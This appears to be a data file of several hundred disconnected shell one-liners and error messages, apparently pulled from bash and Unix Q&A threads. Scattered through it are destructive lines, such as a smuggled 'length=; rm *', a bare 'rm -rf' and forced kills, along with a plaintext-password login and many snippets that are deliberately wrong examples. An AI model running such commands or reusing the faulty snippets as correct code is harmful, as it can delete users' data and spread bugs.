$(date --utc +%FT%TZ)
date --utc +%FT%T.%3NZ
$(date --utc +%FT%T.%3NZ)
date +%FT%T%Z
$(date +%FT%T%Z)
date +%F\(%a\)
$(date +%F\(%a\))
date +%F\(%A\)
$(date +%F\(%A\))
checkDate=$(date "+%s")
checkDate=$(date "+%Y-%m-%d %H:%M:%S")
? )
./MyScript hjrfgdskjgh
? )
. )
./script.sh -'?'
./script.sh -\?
$ gzip -d file.gz
$ gzip -f file.gz
set -e
sed -i '/variableStep/d' zchap*
give the next thing
echo $BUILD_ID | sed "s/[-_]//g" | cut -c1-12
line 13: [: missing ']'
set -e
set -e
bash -x
set -x
set -e
wget & curl
$(awk ...)
export varname="value"
find *
-type f
-maxdepth 1
file_dir="$(dirname "$file")"
echo !123 | pbcopy
!123 = cd ..
pb !!
alias pb='echo !! | pbcopy'
fc -l -1
history -p '!!'
set -x
echo  "$LINE" | sed -e 's/test/true/g' > $NEWFILE
awk '{ print $1" "$2"\n" $3" "$4"\n>" }'
echo $1
[[ "$var" =~ $regex ]]
cut -d/ -f1-3
sh: 0: Can't open adore-djakota-install.sh
for i in ${t[*]};{ ...;}
pushLog someLogFile.txt
Output gives nothing.
/run.sh http://test.svn.com/svn/demo_project ticket-1135 ticket-122 ticket-113
git merge-base
rev-list --children
git branch --contains <commit>
git tag --contains <commit>
git for-each-ref
bash brace_test.csh
paste file1 file2 > file3
egrep '[0-9][0-9\-]*'
egrep '^[0-9]+(-[0-9]+){0,5}$'
someApp "$*"
My first My second
someApp "$@"
My first
My second
echo "Hi this is a dude"
grep -v
$ clear
$ clear
$ which clear
which clear
echo $PATH
echo $PATH
which clear
which -a clear
file new file
file has been changed
uniq -c
while gets(); ... end; puts $_
lpstat -a > printers.txt
`lpstat -a`
which python
cat xyz
sed -e "s/\([^,]*\).*/\1/g" <file>
sed -e "s/,.*//g" <file>
grep hello *
grep hello * | sort -n
| sort -n
i="File Name.txt"
mv File Name.txt le Name.txt
for file in $(ls)
alias ll='ls -l'
ll -a
ls -l-a
if [ "testdir1==NA" ]; then
Pass input: as arguments.
echo $1 $2 $3
START /D
sed -e 's/\n//g'
tr -d '\n'
exec("date +%Z");
while read
Would you like to hello world? (y/N):
while read
-d delim
c <= ${#ARRAY2[@]}
c < ${#ARRAY2[@]}
( ... )
{ ... }
printf %s\\n
printf %s foo
the command
the command | (read l; echo $l; grep blah) | less
a text
tac infile.txt | sed "s/a/c/; ta ; b ; :a ; N ; ba" | tac
sed "$(sed -n /a/= file | sed -n '$s/$/ s,a,c,/p' )" file
sed -n '/a/=' file
tail -n 1
$(sed -n '/a/=' file | tail -n 1)
' s/a/c'
3 s/a/c/
while getopts
Desired output:
set -x
gfind ~/x/y/ | gshuf | ghead -n 1 > ~/Desktop/z.txt
/Users/me/x/y/some folder/some file.txt
open "foo.html?$(date +%s)"
open foo.html
open "$TM_FILEPATH" -a Safari
$f + '.html'
<?=hash('sha256', "\v");?>
echo -e -n "\v" | openssl dgst -sha256
else if
echo -n
PWD variable
(defvar pwd-orig (getenv "PWD"))
(add-hook 'kill-emacs-hook (lambda () (setenv "PWD" pwd-orig)))
open example.html
alias EDITOR
man open
open -a SomeEditor file.html
open -e file.html
open -t file.html
open -t
locate file.ext
xdg-open /usr/local/some/place/file.ext
<(sort file1)
\n 
\n \n
sed 's/\n//g'
usage: myscript.sh {file} {x} {y}
{file} {x} {y}
./myscript.sh elevation.asc 3356387.137 5800803.818
cat -v filename
echo $(fibonacci 0 2)
$(( ))
-d' '
php myPHP.php
for FILES in $DIR;...
for FILES in *; ...
cp $source $target
cp "$source" "$target"
cp "$source" "$target"
cp -- "$source" "$target"
cat -n
cat ./-n
make install
bash plot.sh file
- grep -oP 
- ls -h  
- getopts
screen -r
screen -r
rfiles=$(rsync -rvlpogt /svntags/tags/ /var/www/html/)
$(rsync -rvlpogt /svnbranch/branches/ /var/www/html/)
ls -al
sudo /bin/chown ...
sudo /bin/cp /root/test1 /root/test2
[ "$var" -eq 1 ]
[$lang == "Java"]
[$lang -eq "Java"]
($lang -eq "Java")
/path/to/python ./gen_par_final.py 0 ${filestem}
#! /usr/bin/Python
$ chmod +x gen_par_final.py
echo -e "Enter the file stem name"
read filestem
./gen_par_final.py 0 $filestem
regexp pattern
echo ${procListNOC[$p]};
if [ $exam_pct < 40 ]
if [ "$exam_pct" -lt 40 ]
if [ $exam_pct > 70 ]
if [ "$exam_pct" -gt 70 ]
[ $exam_pct < 40 ]
[ $exam_pct > 70 ]
[ $exam_pct ]
if [ -z $dbTestUser ]
echo $file
echo $A
source /tmp/1.sh
echo $A
python 2.7.3
var=$(awk expression)
 ########    eval "$List=(
seq $Initial $Step $Final
seq $Initial $Step $Final
seq $Initial $Step $Final
ls *MR* | cut -b 8-11
delete * from table_name;
tail -f /var/log/syslog | grep -i failure
MyScriptName -r [InsertFilenameHere]
MyScriptName -r [InsertFilenameHere]
man awk
length=; rm *
man bash
while loop
echo $'\e[33mtext'
s/[,:!?]/ /g
col -b
-A INPUT -i lo -j ACCEPT
export MYT="/home/me/test/my test/"
rename -v
| O |
| B |
man test
finder -eq 1
crontab: 1: No such file or directory
shopt -s extglob
shopt -u extglob
echo -e
set -o vi
man diff
man sdiff
diff -y
man mail
'This is a #test that will #allow me to #remove stuff'
#test #allow #remove
egrep -o '#[^ ]+'
sshd: 
sshd: <username>…
man who
grep -q
grep puddle2_15579636
scala: not found
ps aux | grep some_proces[s] > /tmp/test.txt ; if [ $? -eq 0 ]; then echo 1; else echo 0; fi
grep -vc
file(WRITE <path> <contents>)
[[ .. ]]
( .. )
f2="$f2$i $f3"
echo "$line"
$# -le "1"
3 -le "1"
count(*) 1
echo $file
echo "$file"
{ … }
npm root
U10 => 2
man bash
command >> output_file
Unlimited scrollback
command | less
man less
./tool img/file.png
invalid initializer
char *
argc > 1
--password ''
rm -rf
echo | sed
echo | sed
glob "*/*"
source ~/.bashrc
man bash
. .bashrc
echo $FOO
( cmd1 ; cmd2 )
cygwinpath\bin\bash.exe /cygdrive/c/my_path/test.bash
echo "hi"\n
"%s.*" % part_of_foldername
"in $location/* $location/.*"
sed "s/SERVICE/$service/g"
printf '%q'
for loop
sudo reboot now
bash /path/to/your/script.sh 2000119
umask 0007
umask 0007
for f in /var/cache/pacman/pkg/*; do
Checkout Windows-style, commint Unix style line endings
Checkout as-is, commit Unix-style line endings
. ./script
local IFS=
local -n
jq <<<${arg3[datas]}
find .. -exec
/absolute/path/to/create_vhost.sh site_id domain.com
grep --color
./test.mak -j 10
./test.mak -j 10 -l 0.5
awk '$0=$0" or"'
s/.$/& or/
s/$/ or/
[[ ]]
man test
(( ... ))
compgen -v
compgen -v
set -x
-P  --perl-regexp
-o  --only-matching
ImportError : No module named subprocess
do shell script "while IFS= read -r l; do [[ $l = http* ]] || printf %s " & quoted form of variableUrl & "\"$l\"; done < /tmp/file"
print $i
awk '{print $i}'
on run {input, arguments}
shell = True
arg3 = str(arg3)
% (argument1,argument2,argument3)
f1=$(cat file1)
f1 = a b c
f1=($(cat file1))
man pr
file -f -
awk -f script.awk log.file
last command
alias redo='sudo $(history -p !!)'
alias redo='sudo $(history -p !!)
sudo !!
$(history -p !!)
history -p !!
history -p <lastCommandHere>
history -p !!
alias redo='sudo $(history -p !!)
chmod +x myscript
a certain command
the certain command
man bash
./1.sh Music
use Image::ExifTool
mogrify -strip
hexdump -e '1/1 "%02x"'
def ghi
grep -f
chmod +x mystery myscript
bash -c
exec >file
exec >/dev/stdout
file=${file//[ \\n]/}
test-$(date +"%Y-%m-%d.txt")
find ~/cron/obnam -type f -mtime +3 | xargs rm>>$LOG-FILE 2>&1
group:   $group
( stuff in here )
stuff in here
man locate
man locate
" "
$(stat ...)
$(date ...)
man ping
$mkdir -p $FOAM_RUN
mkdir: missing operand
mkdir -p "$FOAM_RUN"
mkdir: cannot create directory `': No such file or directory
echo $FOAM_RUN
grep .
grep .
grep ""
crontab -l | grep "anm.sh"
CTMP="*/17 * * * * cd /home/administrator/anm-1.5.0 && ./anm.sh"
man 3 termios
echo $PATH >> /tmp/debug.txt
0 or more spaces followed by #
sh -x some.sh
echo $line | awk '{print $1}'
hosts=$(`awk '{print $1}'`)
echo variablename
mput *.gz
mput t1.gz? mput t2.gz? ./temp.sh: line 14: /home/dbadmin: is a directory
find *.gz ...
/home/dbadmin: Is a directory
$SOME_COMMAND /home/dbadmin
bash while syntax
-l 5
-l 0
man find
print cmd_string
print repr(cmd_string)
if [[ 23ab = *ab ]] ; then echo yes; fi
if [[ 23ab =~ [0-9]{1,2}ab ]] ; then echo yes; fi
if [[ 23ab = [0-9]{1,2}ab ]]
[[ $a =~ $b ]]
[[ $a = $b ]]
User/stuartnelson3/Google\ Drive/dotfiles
source-file ~/.tmux.conf
mkdir */new-dir
shopt -s nullglob
shopt -s nullglob
ping -w1 ...
ping -q -w1 -c1 8.8.8.8
exit code
awk NR==7 ABC.mod
tr ' ' '\n' < ~/a1.out > ~/b.dat
awk NR==7
my variable
. /path/to/www.sh
date +%s
$(date +%s)
sed -i "s/...
ls -l
pkgutil --packages
pkgutil --files <name of package>
./test.sh 100
./test.sh 100
echo $l
struct tm
for j ... done
wait -n
stty intr ^X
stty intr ^C
invalid option
gawk version 4.1
man find
Press ENTER or type command to continue
wait <PID>
git pull
git rebase [commit-id-of-the-subversion-head]
git cherry-pick
git svn dcommit
git svn rebase
command 2>&1 > log
command > log 2>&1
command >& log
command > log 1>&2
ls -ld /tmp /xxx
command 2>&1 > log
command > log 2>&1
command >&log
command > log 1>&2
command >log >&2
lsof | grep filename
grep "wv.gold"
grep gold
contains the first nine characters
GNU awk
subl foo.project
/Applications/Sublime Text 2.app/Contents/SharedSupport/bin/subl
source .bash_profile
Installed Packages
GNU find
ls -la
cvs tag
sed -i
sed -i
tail > foo
dd if=yourdata of=file conv=notrunc
dd ... conv=notrunc
-f FILE
sed s|search pattern|replace|
ssh -i $pemfile $targetmachine "$@"
source ~/Enthought/Canopy_64bit/User/bin/activate
Brewster &amp; Jobs
Brewster & Jobs
fun1 || fun2
local -n
"Hello\ {World,Rafi}"
"Hello "{Rafi,World}
"Hello Rafi"
"Hello World"
for p in `cat TEST.txt | awk '{print $2}'`
-vczf ...
im_0001.png, im_0002.png...
im_1.png, im_2.png
#echo "READ?" > /dev/ttyS0
cat /dev/ttyS0
stty -F /dev/ttyS0 -ixon
stty -F /dev/ttyS0 ixoff
-type f
var=( .. )
grep something <<< "$var"
echo "$var" | grep something
getopt lLo:p:t: "-o legal -p another..."
head filename.log
$1 to $x
#!/usr/bin/python -t -O -v
python -O -t -v script.py
#!/usr/bin/perl -w -t
git ls-files --killed
head -1
/usr/bin/test -n "$(git ls-files --killed)"
read REPLY
while read
wget -i
nano ~/.bash_profile
export PATH="/usr/local/bin:/usr/local/sbin:/usr/local/mysql/bin:$PATH"
[ Error writing /home/myname.bash_profile Permission denied ]
sudo nano ~/.bash_profile
ls -la ~ | grep bash
sudo chown yourusername ~/.bash_profile
hari s
leader s
WHENEVER SQLERROR
WHENEVER OSERROR
screencapture -l
i=1; for l in $(osascript -e 'tell app "Finder" to id of windows where visible is true' | tr -d ,); do screencapture -l$l /tmp/$((i++)).png; done
window 2 where visible is true
touch .hidden
chmod 600 .hidden
chmod go-w ~/parent/
cat url_list
‘ls’ terminated by signal 13
date -I
cat PATHTOMYDATA.csv | ./ftupload.sh MYTABLEID
wc -c
wc --bytes
wc -m
wc --chars
echo $BPAR|wc -m
printf ...
wc -m
wc -c
wc -c
./script /
./script /home
./script /home/
tr -s "/"
lynx -dump
echo "${a[*]}"
${a[@]: -2:1}
command -v
command -v
command -v poweroff
[some useless data] --pe_cnt 100 --rd_cnt 1000 [some more data]
ssh PrivateHost
logger -s
ping foobar
logger -s
fname sname    2   4   06:30   5   125%    32  27  84%
'fname sname', '2', '4', '06:30', '5', '125',  '32', '27', '84'
s/ ([0-9])/', '\1/g
', '
blkid -d /dev/null
./modifyFile /path/to/file.abc.12.def
./modifyFile /path/to/file.abc.12.def
| dialog --gauge "Starting..." 7 70
ssh user@host /path/to/run.sh root-dir find-tests | dialog --gauge "Starting..." 7 70
-type f
line 11: ln: command not found
tr '/' '\'
ls *.txt |xargs ...
j=`expr $j + 1`
for i in "$str"
ln -s
( command1; command2; command3; ... ) &
wait <PID>
kill PID
kill -9 PID
ps -ef | grep "command name"
tail my.log
tail -f my.log
kill -9 3315
ps -ef
ps -ef
ps --ppid "1"
lsof -i:port
ps -ef | grep command
kill pid
ps ... | awk/grep/perl/...
kill [your process ID]
kill -9 $(lsof -t -i:8080)
mv -n
printf -v
-regex '\./[0-9]+'
-type d
-exec mv -n -- {}/photo.jpg {}.jpg \;
ls */*.jpg
ls */*
mv 00001/photo.jpg ./00001.jpg
rmdir 00001
| bash
ls */
<img src>
<link src>
<script src>
<base href="">
resolve-uri(@href, "baseurl")
* * * * * command
while true; do ./my_script.sh; sleep 60; done
man cron
man crontab
man bash
watch -h
watch [options] command
-n 1
man watch
man tail
foo bar 12 34
foo bar 12/34
sed -e 's/[1-9][0-9] [1-9][0-9]/\//'
$(ls ...)
sudo sh -c "command > file"
exec "$0" "$@"
read only
cast unbind_variable
local -n VARIABLE=$1
while read ... result= ... done
call (int) unbind_variable()
gdb --help
./configure && make && make loadables
enable -f examples/loadables/readwrite readwrite
readwrite TMOUT
bash 5.0.17
gdb 10.1
-v varname
bash 4.2
'unbind_variable' has unknown return type; cast the call to its declared return type
unknown return type
popen("alias", "r")
execvp("alias", ...)
time frodo
which time
/usr/bin/time frodo
echo $test > test2
{some text size = 0 }
$(readlink -f ./../../../Applications/common/lg-media-server/rpmbuild/pp)
set -- e
state: RUNNING
echo -e $EMAIL_TXT | mail -s "$SUBJECT" $RECIPIENT
"/* some text */"
echo -e
bash -c '...'
startx desktop=fluxbox
find … | sort
Checking out version: XX
git describe --tags
thetagname=$( command_to_get_tag_name )
git describe --tags
git tag | tail -1
git tag --contains
tail -1
disown PID
man bash
p4 client
((p4 user -o %p4user%) | sed "s/perforce/ldap/g")  | p4 user -i -f
string='<span id="/yourid/12345" class="noname">lala1</span><span id="/yourid/34567" class="noname">lala2</span><span id="/yourid/39201" class="noname">lala3</span>'
echo -e '#include <stdio.h>\n int main() { int a=11; int b=22; printf("%d\\n", a); return b; }' | gcc -xc -; w=$(./a.out); echo $?; echo $w
sed 's/=.*//' en-GB.view.acccount.ini > file2
set -- $line
set --
set --
for fname in `cat $mylist`; do
cat $mylist | while read fname ; do
We need to store the regex on a var
${BASH_REMATCH[1]} = "compressed"
${BASH_REMATCH[2]} = ".gz"
[[ sed-4.2.2.tar.bz2 =~ tar.bz2$ ]] && echo matched
GNU bash, version 4.3.11(1)-release (x86_64-pc-linux-gnu)
find -exec
select into
select into
"\x00" "\x01"
\x01  \x11  \x10...
"Jul 2 "
"Jul{2 spaces} "
Jul 2
shell("rm example.csv")
bibliographic record 014776324
<tagType Name=...
ping -c 1 server &>/dev/null | egrep -m 2 -e "[0-9]+"
connect: Network is unreachable
if grep '^[0-9a-zA-Z]\{1,10\}$' <<<$1 ; then ...
-k 4,4
1 2 10
1 10 2
bind -s
dig +short sub.domain.com
dig +short sub.domain.com
grep -Pzo
&& || &&
\[ ... \]
./ runProcessing.sh <param1> <param2>
cannot execute
file not found
ksh yourScript
chmod +x yourScript
./run.sh: line 7: RESPONSE: command not found
bash bashscript.sh first_file.xls,1 second_file,2 third_file,2 ... nth_file,1
IFS=, set -- ${var}
IFS=, read first second third <<< "${tuple}"
set -a
set -a
tail -f | grep "failed password" | tee centralized_log
echo "\033[33mTitle of the Program\033[0m"
Title of the Program
ls | tail -10
command a b c d
<comand> <name>-<version> <path>
<alias> <version>
enable -n kill
enable kill
bash: !H: event not found
bash: sed -i -n "1h; 1\!H; ${g; :a s/\(Name=\"$key\".*<\!\[CDATA\[\"\)$val\(\"\]\]>\)/\1$deval\2/;ta p}" :bad substitution
sed -i -n "1h; 1\!H; $\{g; :a s/\(Name=\"$key\".*<\!\[CDATA\[\"\)$val(\"\]\]>\)/\1$deval\2/;ta p}"
sed: -e expression 1, char 6: unknown command: "\"
event not found
set +H
bad substitution
\${ .. }
Name="foo" <![CDATA["puppies"]]>
[[ -e "$line" ]]
find -name
find -print
find -print
od -x
touch "$(iconv -f utf-8 -t utf-8-mac <<< á.txt)"
echo {1..3}/{1..3}
export BLA=foo
echo $BLA
echo $BLA
M-x setenv
M-x compile
echo $BLA
(setenv "FOO" "bar")
M-x shell
-exec sed
date %s
cd /proc && xterm
cd ..
$ ......
cd ../../../../..
up 3
cd ../../..
up ...(arbitrary number of .'s)...
cd ...
cd ../..
cd ....
cd ../../..
cd ..../foo/bar
if [[ "$(is_git_repository)" != "0" ]] ; ...
if [[ "$(is_git_repository)" -ne "0" ]] ; ...
if [[ "$(is_git_repository)" != 0 ]] ; ...
if [[ "$(is_git_repository)" -ne 0 ]] ; ...
if [[ ! "$(is_git_repository)" ]] ; ...
if !is_git_repository ; ...
if ! is_git_repository ; then ...
exec python -u -- "$0" ${1+"$@"}
# '''
'exec python -u -- "$0" ${1+"$@"} #
python -u --
#!/bin/bash -i
source ~/.bashrc
-a 1
-a 2
-e no
-o 0,1.2,2.2
-o 0,1.2,1.3,2.2
tac syslog.log | sed / date -d "5 minutes ago"
/ .. /,/ .. /
/Jul 4 08:11/
svn log -l 2 index.php
svn log -l 2 index.php | awk {'svn up -r $1 $2'}
svn prev FILENAME
svn log -l 2
SETLOCAL ENABLEDELAYEDEXPANSION
EXIT /B
EXIT /B
fgrep -f list.txt fruits.txt
-i /path/to/private_key
md5deep -rZ
$( )
man bash
printf %q
printf %q
\"foo bar\"
match me
print FILENAME ":" $0;
head -n50
set -x
Option 1:
Option 2 :
Mac Os 10.8
diskutil list [disk]
git status
echo -n "  "
 
 
-n 1
"beißen" -> "bei\223en"
runCommand :: String -> IO System.Process.Internals.ProcessHandle
runCommand $ "ls " ++  cmd
ls: bei�en.txt: No such file or directory
cat <empty>
man 5 passwd
man 5 passwd
getent passwd
echo $PATH
sudo echo $PATH
:let @+=expand("%") . ':' . line(".")
:h python
:h python
-F" "
bash rename.script
bash -x rename.script
shift 1
shift 2
echo $((2# binary number ))
-a 1
-a 2
-e 0
-o 0,1.2,2.2
-o 0,1.2,1.3,2.2
3 bob
3 adam
sort -k1,1 -k3,5
eval $SCRIPT
kill -6 71135
find -type f -name '*py' -print0
find -type --help
man find
mans find type
mans find -type
mangrep pattern page
grep -Eo "\\word{.+}" file_name | sed -e "s/\\word{//" -e "s/}//"
: #
'#' is not recognized as an internal or external command, operable program or batch file.
chmod +x
rem ^
# 2>nul
echo >/dev/null # 1>nul 2> #.bat
del #.bat
here-document delimiter
here-document delimiter
echo >/dev/null # >nul & GOTO WINDOWS & rem ^
exit 0
exit 0
GOTO WINDOWS
Show Symbol
Show End of Line
Extended (\n, \r, \t, \0, \x...)
Find what :
Replace with :
:: exit
command not found
default_type application/octet-stream
default_type text/html
tail -f
ls | s
ls | subl
s file.txt
ls | s
man zshcontrib
autoload -U zmv
zmv -n
diff A B
readlink $Somevar
ABSDIR=`cd $RELDIR; pwd`
cmd 1
[ ]
if [_space_ command _space_ ]
sed -r 's/\[[+]\]//g' file.txt
bash a.sh
echo $(bash a.sh)
echo rt
$(source a.sh && echo ${rt})
. ./a.sh
git checkout SOME_HEAD
git checkout 5420c70
git review
diff --name-only ..HEAD@{1}
git fetch
git log -p ..@{upstream}
git merge FETCH_HEAD
git pull
git fetch
git diff HEAD...origin
git merge
git cherry-pick
declare -A
bash read
foo bar
plop yo
declare -n
local -n
set -e
set +e
source var
grep -nr gaq* /Users/myname/Desktop/website
man grep
unset array[$i]
> file
Desired output:
set -xv
set +xv
cp -f "FILE" "$WORKING"
set -o xv
for var in $(find ...)
brew doctor
brew doctor
ls -l
-bash: /etc/profile.d/rvm.sh: No such file or directory
diff old_file.prop new_file.prop
comm -23 <(cut -d= -f1 old_file) <(cut -d= -f1 new_file)
comm -13 <(cut -d= -f1 old_file) <(cut -d= -f1 new_file)
comm -22 <(cut -d= -f1 old_file) <(cut -d= -f1 new_file)
[ .. ]
[[ .. ]]
eval ${CMD[@]}
ls ~
export PATH
${str: -1}
mkdir /foo/bar/baz
awk -F',' '{print length($1),$0}' file.csv | sort -k1nr | cut -d' ' -f 2-
sort -t, -k+2 -n -r file.csv
a > b
...-f1-3 >> db_to_rs
...-f1-3 >> db_to_rs
... >> db_to_rs_$chr
{1 .. 22}
sleep 10
<( ... )
mv -i
date "+%H"
date --date="last sun"
date -j -v-sun
Unknow option for command 's' (s///?)
echo "Value of VAR3 is $$VAR3"
echo "Value of VAR3 is ${$VAR3}"
Value of ${$VAR3}: bad substitution
myscript.sh | tee textfile.txt
find -print0 -prune
sed "${LINE_NUM}p;d" $FROM_FILE
seq -f arg1 arg2
yyyy-mm-dd HH:MM
declare -p
local -n
ls -la
ls -la
man ln
ls -l
ln -s
[ .. ]
[[ .. ]]
mv "$file" "${file%$BASH_REMATCH}"
awk -F=
ON warning THEN GOTO sendfailemail
set -e
set -e
forever list
*/2 * * * * /var/www/html/ytca/rss.sh
crontab -e
forever list
which forever
php path#/some_job_#.php
make -j 5
chmod 700 parallel.mak
#!/usr/bin/make -f
./parallel.mak -j 5
./parallel.mak -j -l 1.0
kill $$
kill PID
kill 0
kill $$
bad substitution
date --set="2013-07-10"+%T
date -d hh:mm
/bin/awk -vRS= -vFS="\n" "{print $1}
if [ $(python $TOOL $f) = "ABC" ]
./filter.sh: line 13: [: =: unary operator expected
exit( "ABC" )
CREATE DATABASE
{ ... }
find -mtime 0
man -7
man --ascii [command] >> file.txt
splot "9.90000000orbs.dat" u 1:2:(10+4*($M-$M_i))
find . -type f -print0 | xargs -0 ls -l | sort -k5,5rn > ~/files.txt
find ~ -size +100M ! -path ~/Documents\* ! -path ~/Library\*
find ~ -size +100M | grep -v "^$HOME/Documents/" | while IFS= read -r l; do stat -f'%z %N' "$l"; done | sort -rn
shopt -s extglob; find ~/!(Documents) -type f -exec stat -f'%z %N' {} \; | sort -rn | head -n200
mdfind 'kMDItemFSSize>=1e8&&kMDItemContentTypeTree!=public.directory' | while IFS= read -r l; do stat -f'%z %N' "$l"; done | sort -rn
-type f
ls -l
ls -l
ls -lh
echo "$filename" | sed ...
GNU sed
sed --version
readlink -f
dirname "$1"
cd "$(dirname "$1");
pwd -P
-d ''
-d ''
sort -R
sed -i "s/\r//g" file
timestamp OK
b < a-1
find -name '*.jpg' -print0 | xargs -0 qiv
qiv **/*.jpg
$a < 10
$a < 10
time ls -la .
time cat a_long_file
time du -h
# ls /var/aaaaaaaaa
ls: cannot access
sys.argv[1] = filename_pattern*
sys.argv[1] = filename_pattern-2013-06-30
git clone
l (first line No. you need to check)
d (difference)
aa bb 2 dfd 3 asf 555
"/usr/bin/env: ruby_noexec_wrapper"
-o -name
-regextype posix-extended
mv $oldfile /home/u0146121/backupfiles/${oldfile}_$(date +%F-%T)
./crontab.sh --remove
sed -e "\?^$cron_unique_label\$?,/^\$/ d"
sed -e '/start/,/end/ d'
crontab -l
crontab -
awk's  mktime()
("-o" "-path" "$dir/archive" "-prune" "-o" "-path" "$dir/crl" "-prune" "-o" "-path" "$dir/cfg" "-prune")
p1q p2q p3q
a=(1 2 3)
p1 2 3q
printf -- '-o -path "$dir/%s" -prune ' ${ignore[@]}
$0 and $1
bash /path/to/create_backup.sh
$( grep ... )
[ -z ... ]
defaults write ./file.plist WhitelistedBlockedPlugins -array '<dict><key>a</key><string>b</string></dict>'
rm -rf
rmdir /s /q
echo y | rmdir /s
$ 
DEL  and  RM
RMDIR /S /Q   and   RM -R ; RM -RF
RMDIR /S   and   RM -RI
<s>I'M HOPING TO GET</s> ANYONE IS WELCOME TO ANSWER WITH A MORE THOROUGH "MOVE AND MV" TEST
echo $RANDOM
echo $RANDOM; echo $RANDOM
read -t1 < <(stat -t "/my/mountpoint")
> /dev/null 2>&1
if [ -d /path/to/mountpoint ] ; then ... fi
[ -d /some/mountpoint ]
read -t1
sed '3iline 3' input.txt > input.txt
sed '3iline 3' input.txt > tmp.txt && cat tmp.txt > input.txt
man sed
version = $version
#!/usr/bin/env bash
#!/usr/bin/env bash
runuser -s /bin/bash @user_name -c $command
wait pid
expr index $string $substring
date +%S
[ $(($x)) -lt $(($y)) ]
[[ $x -lt $y ]]
Arithmetic Expansion
ARITHMETIC EVALUATION
man bash
(( ))
[[ ]]
(( ))
myprog -help
bind -l
ug_ugbapi-all.jar and QuoteTester.class classes
GNU coreutils 6.12
else condition
if [[ ${array[$i]} ]]; then  array[$i]=0;fi
[[ something ]]
[[ -z thing ]]
foo 0 bar
-d ' '
fg 
fg %job
myprogram < /dev/null &
nohup myprogram &
set -u
chmod 700 ~/.cloginrc
apt-get install rancid
/usr/lib/rancid/bin/clogin -u admin -p MyPassword 192.168.11.1
cat file.txt
man 5 acl
./script.sh -l file
./script -wl file
printf "%s\n" {0..n} | xargs -P 8 -n 1 ./program
source ~/.bash_profile
-bash: cmd_name_here: command not found
vi ~/.bash_profile
--exclude="\"/proc\" --exclude=\"/media\" ..."
(15.84675 - 12.635639)= 3.211111
cd jobs
printf %q
JOB CONTROL
alias foo='bar'
echo alias foo=\'bar\' >> ~/.bash_profile
echo "alias foo='bar'" >> ~/.bash_profile
echo alias foo=\'bar\'
echo "alias foo='bar'"
alias foo='bar'
alias foo='bar'
alias foo=bar
./test.sh hello
cat file
sed -i -e ...
run foo arg1 arg2
run foo "arg1 arg2"
brew install
type -a [program]
builtin echo
command echo
make -C mydir
echo */ | wc
1     309    4594
2nd digit
tree -L 1 | tail -1
-type d
wc -l
stat -c %h folder
stat -c %h folder
wc -l
do not list implied . and ..
ls -l | grep "^d" | wc -l
" line "
echo -n ${f1[$i]}
$((ARG1 + ARG2))
if [ -f  $video_title.$ext1 ]
set -xv
set -xv
set +xv
$ man test
[ ... ]
source ./this_script.sh
export foo="bar spam eggs"
foo="bar spam eggs"
== 'export'
ssh user@remote command
echo \$HOME
read -r
id="$(echo $line | awk '{print $1}')"
$(echo $line | awk '{print $1}'
growlnotify -t Terminal -m "The System... Is Down." && tput bel
yes | ./myscript.pl
last=$(($#students[@]} - 1))
seq 1 100 | while read o; do SCRIPT; done
test $o -gt $mid
12345,-d somedesc -l somelabel
12345,-d somedesc -l somelabel:6789, -d anotherdesc -l anotherlabel
i=0; for f in *; do d=dir_$(printf %03d $((i/100+1))); mkdir -p $d; mv "$f" $d; let i++; done
echo '--exclude={AAA,BBB}'
echo --exclude=AAA --exclude=BBB
NR==1 {v=$3}
{print v,$0}
r=20 and c=3
sudo mn
xterm h1
xterm h2
set ip address
sudo mn -c
echo $pid
echo ${pid}
<( )
nmap | while
[07mSome Message Here[0m
reset -c
ls -F
grep --color=auto
grep --color=auto "your regex" > example.csv
export GREP_OPTIONS='--color=auto'
color ./foo.sh
-c _cmd_
iw events | yourmonitorprogram
tail -f
CREATE DATABASE
info bash
man bash
info bash
^ *test
man sudoers
make run
A[i] < A[left]
A[i][2] < A[left][2]
-f blacklistwords.txt
grep -i -F -w -v -f blacklistwords.txt file1.txt
(here is Wed. 10:58 AM)
:! <script>
export PATH="$PATH:~/Dropbox/Work/Scripts"
:!PythonTidy.py % %
:!~/Dropbox/Work/Scripts/PythonTidy.py % %
export PATH="~/Dropbox/Work/Scripts:$PATH"
python2.7 main.py > main.out &
nohup python2.7 main.py &> main.out &
python2.7 main.py > main.out
type -t
-I {}
-n 1
-P 20
<(find -name ...)
cmd1 | cmd2
-d ''
grep -c
grep -o pattern file | wc -l
server: 127.0.0.1
server: 127.0.0.1
./test.sh &
ps lax | grep test.sh
cd ".."
sed -i "/CenterListName/ s/=$/= $(cat center.dat)/" AnalyzeClusterParameterFile$c
/^[ \t]*ODI_SESJA_ID CONSTANT/
ls /
date +%s
$elapsed_time > 600
bash version 4
bash v 4 or later
system("/var/tmp/runme.sh &");
head -1
sort -rn -t: -k2
line number:delay
awk -v var=$some_var
NR==line {}
{print "longest delay was **", delay, "** on", $1, $2, "at", $3, "at server",$4, "\n\n",$0}
same size
txt files
wmctrl -a "CVS commit"
[^\ ]+
history | vim
vim -
awk -F"/" '{printf( "%s\n", $3) }' test > newfile
GNU sort
du -h
A && B
echo ... | gcc ...
gcc ... && ./a.out
gcc ...; ./a.out
cat a.txt | xargs vi
stty sane
emacs --batch
stty sane
find, grep -l ...(in your case, the cat too)
progA | progB | progC
expr ...
`echo ...|grep...`
expr ...
`echo ...|grep ...`
`echo ...|grep...`
grep -E
git diff-index --name-only --ignore-submodules HEAD --
git status -sb
git pull
git merge-base
git rev-parse
git merge-base <branch> <remote branch>
git rev-parse <remote branch>
git rev-parse <branch>
git fetch
git for-each-ref --format='%(upstream:short)' refs/heads/<branch>
> 0
git fetch
git status -sb
git fetch
behind_count = $(git rev-list --count HEAD..@{u})
ahead_count = $(git rev-list --count @{u}..HEAD)
git rev-list
exec 3> /path/to/file
sudo sh ./backup.sh
sudo chmod +x backup.sh
0 10 * * * /var/www/magicpin/backup/backup.sh
sudo crontab -e
crontab -e
0 10 * * * sudo sh /var/www/magicpin/backup/backup.sh
File list
Report file
find ~/ -name “foo*” –mtime -3 print>report
Sort report –o report
while read comp1 <&3 && comp2 <&4
if [[ $comp1 = comp2 ]] then
echo “file found” >/dev/null
echo “$comp1 not found”
done 3<report 4<list
man 8 ld-linux
bash my_script
alias .="cd .."
alias .="cd .."
cd ..
yes | ./script
git log
apt-get install
git log
apt-get install
sort -u
ls -a
cd /home/username/${FOO}/${BAR}
/bin/.: Permission denied.
if: Expression Syntax.
ln -s
ln -s ./eclipse.ini ~/Desktop/eclipse1
ln -s $(pwd)/eclipse.ini ~/Desktop/eclipse
